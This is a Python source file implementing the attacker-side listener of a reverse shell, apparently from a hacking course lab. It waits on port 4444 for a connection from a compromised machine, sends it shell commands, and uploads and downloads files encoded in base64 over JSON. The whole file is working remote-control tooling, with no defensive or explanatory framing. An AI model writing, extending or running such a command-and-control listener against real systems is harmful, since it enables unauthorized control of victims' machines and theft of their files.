import socket
import json
import base64
import sys


class Listener:
    def __init__(self, ip, port) -> None:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print(f"[+] Connection established from {str(address)}")


    def print_funct_info(self, funct_name, data):
        if print_function_info == True:
            if funct_name == "run":
                print("\n# # # # # # # # # # # # # # # # # # # # # #")
            print(f"\n{funct_name}")
            print(type(data))
            print(data)
        return


    def reliable_send(self, data):
        json_data = json.dumps(data.decode())
        self.print_funct_info("reliable_send", json_data)
        self.connection.send(json_data.encode())


    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                self.print_funct_info("reliable_receive_raw", json_data)
                self.print_funct_info("reliable_receive_converted", json.loads(json_data))
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_remotely(self, command):
        self.print_funct_info("execute_remotely", command)

        self.reliable_send(command.encode())
        if command == "exit":
            self.connection.close()
            print("Goodby!")
            sys.exit()
        return self.reliable_receive()


    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())


    def run(self):
        while True:
            command = input(">> ")
            split_command = command.split(" ")
            self.print_funct_info("run", command)

            try:
                if command.startswith("upload"):
                    file_content = self.read_file(split_command[1])
                    upload_cmd_and_contents = []
                    upload_cmd_and_contents.append(split_command[0])
                    upload_cmd_and_contents.append(split_command[1])
                    upload_cmd_and_contents.append(file_content.decode())
                    print(f"[+] Uploading file: {split_command[1]}")
                    result = self.execute_remotely(str(upload_cmd_and_contents))
                    print("[+] Upload successful")
                    continue
                result = self.execute_remotely(command).encode()

                if command.startswith("download") and "[-] Error" not in result.decode():
                    result = self.write_file(command[9:], result)
                    print("[+] Download successful")
                    continue
            except Exception:
                result = "[-] Error during local command execution"

            self.print_funct_info("result", "_result_")
            if isinstance(result, str):
                print(result)
            else:
                print(result.decode())


try:
    print_function_info = False
    my_listener = Listener("10.0.2.15", 4444)
    # my_listener = Listener("192.168.74.50", 4444)
    my_listener.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ... terminating app, please wait.")

print("Goodbye!")
